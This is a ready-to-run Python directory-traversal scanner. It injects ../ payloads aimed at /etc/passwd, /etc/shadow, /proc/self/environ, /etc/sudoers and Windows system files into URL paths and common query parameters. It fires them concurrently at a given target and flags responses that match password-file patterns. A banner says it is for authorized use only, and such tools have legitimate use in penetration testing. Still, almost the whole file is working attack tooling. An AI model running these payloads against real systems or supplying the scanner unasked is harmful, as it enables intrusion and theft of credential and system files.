#!/usr/bin/env python3
"""
Dependencies
------------
- requests
Install: pip install requests
"""

from __future__ import annotations
import argparse
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Any, Optional
from urllib.parse import urljoin, urlparse

import requests

# ---------------------------
# Configuration / Payloads
# ---------------------------
PAYLOADS = [
    "../../../../../../etc/passwd",
    "../../../../../../etc/shadow",
    "../../../../../../etc/hosts",
    "../../../../../../proc/self/environ",
    "../../../../../../etc/fstab",
    "../../../../../../boot.ini",
    "../../../../../../windows/win.ini",
    "../../../../../../windows/system.ini",
    "../../../../../../Windows/System32/drivers/etc/hosts",
    "../../../../../../etc/group",
    "../../../../../../etc/sudoers",
    "../../../../../../etc/security/opasswd",
    "../../../../../../etc/issue",
]

COMMON_PARAM_NAMES = ["file", "path", "page", "template", "name", "view", "include"]

# Heuristics: regex patterns that strongly indicate sensitive files
HEURISTICS = {
    "passwd": re.compile(r"root:x:0:0:|:x:0:0:|/bin/bash|/bin/sh"),
    "shadow": re.compile(r"^[^:]+:[\*!\$].+?:"),
    "hosts": re.compile(r"^127\.0\.0\.1|localhost|^::1", re.M),
    "boot_ini": re.compile(r"\[boot loader\]|\[operating systems\]", re.I),
    "win_ini": re.compile(r"\[\.DEFAULT\]|\[fonts\]|microsoft", re.I),
    "passwd_like": re.compile(r"^[a-zA-Z0-9_\-]+:x:\d+:\d+:", re.M),
}

# Generic suspicious keywords that often show up in sensitive files (lowercased checks used)
SUSPICIOUS_KEYWORDS = [
    "root:x:",
    "shadow",
    "passwd",
    "sensitive",
    "private",
    "root:.*:0:0",
    "boot loader",
    "windows",
    "administrator",
]

# ---------------------------
# Utility functions
# ---------------------------

def normalize_url(target: str) -> str:
    """Ensure URL has scheme and no trailing slash (we keep path for path-based fuzzing)."""
    parsed = urlparse(target)
    if not parsed.scheme:
        target = "http://" + target
        parsed = urlparse(target)
    return target.rstrip("/")


def make_candidate_urls(base: str, payloads: List[str]) -> List[str]:
    """Create candidate URLs by injecting payloads into different places:
    - Replace the last path segment with payload
    - Append payload to the existing path
    - Add as query parameter to common param names
    """
    parsed = urlparse(base)
    base_root = f"{parsed.scheme}://{parsed.netloc}"
    path = parsed.path or "/"
    segments = [seg for seg in path.split("/") if seg]

    candidates = set()

    # 1) Append payload to current path
    for p in payloads:
        candidates.add(urljoin(base + '/', p))

    # 2) Replace last segment (if any) with payload
    if segments:
        prefix = '/'.join(segments[:-1])
        prefix_path = f"/{prefix}/" if prefix else '/'
        for p in payloads:
            candidates.add(base_root + prefix_path + p)

    # 3) Place payloads as query parameters
    for param in COMMON_PARAM_NAMES:
        for p in payloads:
            candidates.add(base + f"?{param}={p}")

    return sorted(candidates)


def is_suspicious_response(resp: requests.Response) -> Optional[Dict[str, Any]]:
    """Analyze response content and headers to decide if it looks like sensitive data.
    Returns a dict with 'reason' and snippet if suspicious, otherwise None.
    """
    try:
        text = resp.text
    except Exception:
        return None

    lower = text.lower()

    # Check heuristics (strong signals)
    for name, pattern in HEURISTICS.items():
        if pattern.search(text):
            snippet = _grab_snippet(text, pattern)
            return {"type": name, "snippet": snippet, "status_code": resp.status_code}

    # Check for suspicious keywords
    for kw in SUSPICIOUS_KEYWORDS:
        if kw in lower:
            # return small snippet
            snippet = _grab_keyword_snippet(text, kw)
            return {"type": "keyword_match", "keyword": kw, "snippet": snippet, "status_code": resp.status_code}

    # Abnormal content-length vs typical (small site) — heuristic
    content_len = len(text)
    if content_len > 2000 and resp.status_code == 200:
        return {"type": "large_2000_plus", "snippet": text[:500], "status_code": resp.status_code}

    return None


def _grab_snippet(text: str, pattern: re.Pattern, length: int = 240) -> str:
    m = pattern.search(text)
    if not m:
        return text[:length]
    start = max(0, m.start() - 80)
    return text[start:start+length]


def _grab_keyword_snippet(text: str, keyword: str, length: int = 240) -> str:
    idx = text.lower().find(keyword)
    if idx == -1:
        return text[:length]
    start = max(0, idx - 60)
    return text[start:start+length]

# ---------------------------
# Scanner core
# ---------------------------

def scan_target(target: str, threads: int = 10, timeout: int = 6, rate_limit: float = 0.0, max_tests: Optional[int] = None) -> Dict[str, Any]:
    target = normalize_url(target)
    candidates = make_candidate_urls(target, PAYLOADS)
    if max_tests:
        candidates = candidates[:max_tests]

    results = []
    summary = {"target": target, "total_tests": len(candidates), "findings": []}

    headers = {
        "User-Agent": "dir-traversal-scanner/1.0 (+https://example.com)"
    }

    session = requests.Session()
    adapter = requests.adapters.HTTPAdapter(max_retries=1)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        future_to_url = {}
        for url in candidates:
            fut = executor.submit(_fetch_url, session, url, headers, timeout)
            future_to_url[fut] = url
            if rate_limit > 0:
                time.sleep(rate_limit)

        for fut in as_completed(future_to_url):
            url = future_to_url[fut]
            try:
                resp = fut.result()
            except Exception as e:
                results.append({"url": url, "error": str(e)})
                continue

            # Basic checks
            entry = {"url": url, "status_code": resp.status_code, "content_length": len(resp.content)}

            if resp.status_code == 200:
                suspicious = is_suspicious_response(resp)
                if suspicious:
                    finding = {"url": url, "status_code": resp.status_code, "evidence": suspicious}
                    summary["findings"].append(finding)
                    entry["suspicious"] = True
                    entry["evidence"] = suspicious
                else:
                    entry["suspicious"] = False
            else:
                entry["suspicious"] = False

            results.append(entry)

    summary["scanned_urls"] = results
    return summary


def _fetch_url(session: requests.Session, url: str, headers: Dict[str, str], timeout: int) -> requests.Response:
    # Try GET. No redirects allowed by default (to avoid following to login pages)
    try:
        resp = session.get(url, headers=headers, allow_redirects=False, timeout=timeout, verify=True)
        return resp
    except requests.RequestException as e:
        # Re-raise so caller records the error
        raise

# ---------------------------
# CLI
# ---------------------------

def parse_args():
    p = argparse.ArgumentParser(description="Directory traversal scanner (authorized use only)")
    p.add_argument("target", help="Target URL (include scheme e.g. https://example.com/path)")
    p.add_argument("--threads", type=int, default=10, help="Concurrent worker threads")
    p.add_argument("--timeout", type=int, default=8, help="Request timeout in seconds")
    p.add_argument("--rate", type=float, default=0.0, help="Delay (seconds) between scheduling requests")
    p.add_argument("--max-tests", type=int, default=None, help="Limit number of payload tests (for fast demos)")
    p.add_argument("--out", default=None, help="Write JSON report to file")
    p.add_argument("--quiet", action="store_true", help="Minimal output to stdout")
    return p.parse_args()


def main():
    args = parse_args()

    print("[+] directory-traversal-scanner starting")
    print("[!] Legal: only run against targets you are authorized to test")

    result = scan_target(args.target, threads=args.threads, timeout=args.timeout, rate_limit=args.rate, max_tests=args.max_tests)

    if args.out:
        with open(args.out, 'w', encoding='utf-8') as fh:
            json.dump(result, fh, indent=2, ensure_ascii=False)
        if not args.quiet:
            print(f"[+] Report written to {args.out}")
    else:
        # Print summarized findings
        if not args.quiet:
            print(json.dumps(result, indent=2, ensure_ascii=False))
        else:
            # quiet mode: print count of findings
            print(f"findings={len(result.get('findings', []))}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print('\n[!] Interrupted by user', file=sys.stderr)
        sys.exit(1)
